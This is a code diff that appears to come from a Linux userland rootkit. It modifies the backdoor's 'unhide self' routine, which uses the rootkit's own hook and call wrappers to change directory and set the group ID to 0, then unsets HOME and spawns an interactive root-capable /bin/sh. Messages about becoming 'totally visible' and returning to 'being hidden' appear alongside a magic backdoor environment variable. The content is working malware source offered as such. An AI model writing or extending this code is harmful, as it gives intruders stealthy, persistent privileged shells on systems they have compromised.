@@ -30,16 +30,36 @@ void option_err(char *a0){
 }
 void do_self(void){
     printf("Unhiding self...\n");
-    chdir("/");
-    unhide_self();
+    
+    pid_t pid=fork();
+    if(pid < 0){
+        printf("Failed fork.\n");
+        return;
+    }else if(pid > 0){
+        for(int i=0; i<3; i++)
+            close(i);
+        wait(NULL);
+        return;
+    }
+
+    if(setsid() < 0){
+        printf("Failed setsid.\n");
+        return;
+    }
+
+    hook(CSETGID, CCHDIR);
+    call(CCHDIR, "/");
+    unsetenv("HOME");
+    call(CSETGID, 0);
+
     system("id");
-    printf("You're now totally visible. 'exit' when you want to return to being hidden.\n");
 
     char *args[3];
     args[0] = "/bin/sh";
     args[1] = "-i";
     args[2] = NULL;
 
+    printf("You're now totally visible. 'exit' when you want to return to being hidden.\n");
 #ifdef SET_MAGIC_ENV_UNHIDE
     char *env[2];
     env[0] = BD_VAR"=1";
@@ -49,6 +69,7 @@ void do_self(void){
 #else
     execl(args[0], args[1], NULL);
 #endif
+    exit(0);
 }
 
 void symlinkstuff(void){
